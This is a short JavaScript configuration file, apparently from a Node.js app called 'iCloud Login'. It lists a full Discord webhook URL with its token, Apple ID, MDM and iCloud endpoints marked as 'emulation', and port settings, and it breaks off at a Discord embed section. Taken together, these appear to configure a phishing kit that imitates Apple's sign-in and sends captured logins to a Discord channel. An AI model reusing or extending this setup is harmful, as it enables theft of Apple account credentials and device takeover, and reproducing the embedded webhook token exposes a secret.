module.exports = {
    // Discord Webhook URL
    discordWebhook: 'https://discord.com/api/webhooks/1483182140492611625/7JNKtGxkQlQBehia2Aqtx_SbTflKd-oGtsr0eB70DBJ1ySc10F22JlYiWtpn8tDhmOXv',
    
    // Apple API endpoints (эмуляция)
    appleAPI: {
        auth: 'https://appleid.apple.com/auth/authorize',
        mdm: 'https://mdm.apple.com/manage',
        icloud: 'https://www.icloud.com'
    },
    
    // Настройки приложения
    app: {
        name: 'iCloud Login',
        version: '2.0.1',
        environment: process.env.NODE_ENV || 'development',
        port: process.env.PORT || 3000
    },
    
    // Discord embed настройки
